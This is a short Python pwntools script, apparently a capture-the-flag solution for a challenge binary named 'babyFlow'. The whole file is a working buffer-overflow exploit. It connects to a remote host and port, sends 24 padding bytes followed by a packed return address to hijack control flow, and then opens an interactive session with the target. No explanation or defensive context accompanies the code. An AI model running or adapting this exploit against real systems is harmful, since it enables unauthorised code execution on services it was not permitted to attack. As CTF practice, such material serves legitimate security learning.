from pwn import *


p = remote('143.198.219.171', 5000)
#p = process('./babyFlow')
print(p.recv())
p.sendline(b'A' * 24 + p32(0x80491fc))
p.interactive()
